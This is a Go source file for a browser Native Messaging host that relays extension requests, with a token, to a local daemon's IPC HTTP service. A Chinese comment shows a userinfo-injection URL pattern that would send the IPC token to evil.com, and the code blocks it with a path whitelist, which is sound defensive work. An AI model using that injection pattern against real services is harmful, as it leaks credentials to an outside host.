package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"time"

	"drop/core/identity"
)

// drop native-host —— 浏览器 Native Messaging 宿主。
// 由浏览器以 stdio 管道方式拉起（无窗口），把扩展的请求转发给
// 本机 daemon 的 IPC 服务；凭据从不经过浏览器扩展本身。
// 消息格式：4 字节小端长度 + JSON，响应同格式。

type nmRequest struct {
	Path   string          `json:"path"`
	Method string          `json:"method"`
	Body   json.RawMessage `json:"body"`
}

// nmPathRe 面板 API 路径的封闭形状（/api/name，二级如 /api/pair/start）。
// path 由扩展提供且直接拼进 URL，而 "http://127.0.0.1:42709@evil.com/?t=TOKEN"
// 的 host 是 evil.com（127.0.0.1:42709 退化成 userinfo）：不校验就等于
// 把 IPC token 泄露到外网并可探测内网端口。白名单顺带挡掉 @ ? # 空白 与 ..；
// 查询串不放行——扩展侧参数都在 body 里。
var nmPathRe = regexp.MustCompile(`^/api/[a-z0-9][a-z0-9-]*(/[a-z0-9][a-z0-9-]*)?$`)

func nativeHostLoop() error {
	stdin := bufio.NewReader(os.Stdin)
	for {
		var lenBuf [4]byte
		if _, err := io.ReadFull(stdin, lenBuf[:]); err != nil {
			return nil // 浏览器断开 = 正常结束
		}
		n := binary.LittleEndian.Uint32(lenBuf[:])
		if n == 0 || n > 4<<20 {
			return fmt.Errorf("非法消息长度 %d", n)
		}
		body := make([]byte, n)
		if _, err := io.ReadFull(stdin, body); err != nil {
			return err
		}
		resp := handleNM(body)
		out, err := json.Marshal(resp)
		if err != nil {
			out, _ = json.Marshal(map[string]any{"ok": false, "message": "响应编码失败"})
		}
		var outLen [4]byte
		binary.LittleEndian.PutUint32(outLen[:], uint32(len(out)))
		if _, err := os.Stdout.Write(outLen[:]); err != nil {
			return nil
		}
		if _, err := os.Stdout.Write(out); err != nil {
			return nil
		}
	}
}

func handleNM(body []byte) map[string]any {
	var req nmRequest
	if err := json.Unmarshal(body, &req); err != nil || req.Path == "" {
		return map[string]any{"ok": false, "message": "请求无效"}
	}
	if !nmPathRe.MatchString(req.Path) ||
		(req.Method != "" && req.Method != http.MethodGet && req.Method != http.MethodPost) {
		return map[string]any{"ok": false, "message": "请求无效"}
	}
	raw, err := os.ReadFile(filepath.Join(identity.AppDir(), "ipc.json"))
	if err != nil {
		return map[string]any{"ok": false, "message": "Columba 后台未运行"}
	}
	var info struct {
		Port  int    `json:"port"`
		Token string `json:"token"`
	}
	if err := json.Unmarshal(raw, &info); err != nil || info.Port == 0 {
		return map[string]any{"ok": false, "message": "Columba 后台信息无效"}
	}

	method := req.Method
	if method == "" {
		method = http.MethodGet
	}
	var bodyReader io.Reader
	if len(req.Body) > 0 {
		bodyReader = bytes.NewReader(req.Body)
	}
	u := fmt.Sprintf("http://127.0.0.1:%d%s?t=%s", info.Port, req.Path, info.Token)
	httpReq, err := http.NewRequest(method, u, bodyReader)
	if err != nil {
		return map[string]any{"ok": false, "message": err.Error()}
	}
	httpReq.Header.Set("Content-Type", "application/json")
	client := &http.Client{Timeout: 60 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return map[string]any{"ok": false, "message": "无法连接 Columba 后台"}
	}
	defer resp.Body.Close()
	var data json.RawMessage
	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
		return map[string]any{"ok": false, "message": resp.Status}
	}
	return map[string]any{"ok": resp.StatusCode == http.StatusOK, "status": resp.StatusCode, "data": data}
}
